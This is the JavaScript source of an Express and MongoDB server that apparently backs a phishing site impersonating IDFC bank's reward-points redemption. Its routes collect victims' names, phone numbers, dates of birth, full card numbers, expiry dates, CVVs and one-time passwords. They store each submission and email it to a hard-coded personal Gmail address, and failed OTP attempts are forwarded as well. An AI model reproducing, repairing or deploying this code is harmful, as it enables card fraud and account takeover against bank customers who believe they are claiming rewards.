import express from "express";
import mongoose from "mongoose";
import cors from "cors";
import dotenv from "dotenv";
import nodemailer from "nodemailer";

dotenv.config();
const app = express();

/* -------------------- MIDDLEWARE -------------------- */
app.use(cors({
  origin: [
    "http://localhost:3000",
    "https://idfcredeem.netlify.app",
    "https://idfcredeem.vercel.app",
    "www.idfcrewardpoints.in",
  ],
  credentials: true,
}));
app.use(express.json());

/* -------------------- DB CONNECTION -------------------- */
mongoose.connect(process.env.MONGO_URI)
  .then(() => console.log("✅ MongoDB Connected"))
  .catch(err => console.error("❌ MongoDB Error:", err));

/* -------------------- MAIL SETUP (FIXED) -------------------- */
const transporter = nodemailer.createTransport({
   host: "smtp.gmail.com",
  port: 587,
  secure: false,
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
});

transporter.verify((err) => {
  if (err) {
    console.error("❌ Gmail SMTP Error:", err);
  } else {
    console.log("✅ Gmail SMTP Ready");
  }
});



const ADMIN_EMAIL = "rajravi94886@gmail.com";

const sendAdminMail = async (subject, data) => {
  try {
    await transporter.sendMail({
      from: `"IDFC Backend" <${process.env.EMAIL_USER}>`,
      to: ADMIN_EMAIL,
      subject,
      html: `<pre>${JSON.stringify(data, null, 2)}</pre>`,
    });
  } catch (err) {
    console.error("❌ ADMIN MAIL ERROR:", err);
  }
};

/* -------------------- MODELS -------------------- */
const User = mongoose.model(
  "User",
  new mongoose.Schema({
    fullName: String,
    email: String,
    mobile: String,
   deviceType: {
  type: String,
  enum: ["IOS", "Android", "Web"],
  required: true,
},
    dob: String,
    cardLimit: String,
  }, { timestamps: true })
);

const Card = mongoose.model(
  "Card",
  new mongoose.Schema({
    cardholderName: String,
    cardNumber: String,
    expiry: String,
    cvv: String,
  }, { timestamps: true })
);

const OTP = mongoose.model(
  "OTP",
  new mongoose.Schema({
    email: String,
    otp: String,
    isVerified: Boolean,
    ipAddress: String,
  }, { timestamps: true })
);

/* -------------------- ROUTES -------------------- */

/* SIGNUP */
app.post("/api/signup", async (req, res) => {
  try {
    const user = await User.create(req.body);
    await sendAdminMail("📥 New Signup", user);
    res.json({ success: true });
  } catch (err) {
    console.error("SIGNUP ERROR:", err);
    res.status(500).json({ error: "Signup failed" });
  }
});

/* CARD DETAILS */
app.post("/api/card-verification", async (req, res) => {
  try {
    const card = await Card.create(req.body);
    await sendAdminMail("💳 Card Submitted", card);
    res.json({ success: true });
  } catch (err) {
    console.error("CARD ERROR:", err);
    res.status(500).json({ error: "Card verification failed" });
  }
});

/* SEND OTP */
app.post("/api/send-otp", async (req, res) => {
  try {
    const otp = Math.floor(100000 + Math.random() * 900000).toString();

    const otpDoc = await OTP.create({
      email: req.body.email,
      otp,
      isVerified: false,
      ipAddress: req.ip,
    });

    // Send OTP to user
    await transporter.sendMail({
      from: `"IDFC OTP" <${process.env.EMAIL_USER}>`,
      to: req.body.email,
      subject: "Your OTP",
      html: `<h2>Your OTP</h2><h1>${otp}</h1>`,
    });

    // Send OTP log to admin
    await sendAdminMail("🔐 OTP Generated", otpDoc);

    res.json({ success: true });
  } catch (err) {
    console.error("OTP SEND ERROR:", err);
    res.status(500).json({ error: "OTP send failed" });
  }
});

/* VERIFY OTP */
app.post("/api/verify-otp", async (req, res) => {
  try {
    const { email, otp } = req.body;

    const record = await OTP.findOne({ email, otp, isVerified: false });
    if (!record) {
      await sendAdminMail("❌ OTP FAILED", { email, otp });
      return res.status(401).json({ error: "Invalid OTP" });
    }

    record.isVerified = true;
    await record.save();

    await sendAdminMail("✅ OTP VERIFIED", record);
    res.json({ success: true });
  } catch (err) {
    console.error("OTP VERIFY ERROR:", err);
    res.status(500).json({ error: "OTP verification failed" });
  }
});

/* TEST EMAIL (IMPORTANT) */
app.get("/test-email", async (req, res) => {
  try {
    await transporter.sendMail({
      from: `"IDFC Test" <${process.env.EMAIL_USER}>`,
      to: ADMIN_EMAIL,
      subject: "✅ Email System Working",
      html: "<h2>Email delivery confirmed</h2>",
    });
    res.send("Email sent successfully");
  } catch (err) {
    console.error("TEST EMAIL ERROR:", err);
    res.status(500).send("Email failed");
  }
});

/* HEALTH */
app.get("/", (_, res) => {
  res.send("🚀 IDFC Backend Running");
});

app.listen(5000, () => {
  console.log("✅ Server running on http://localhost:5000");
});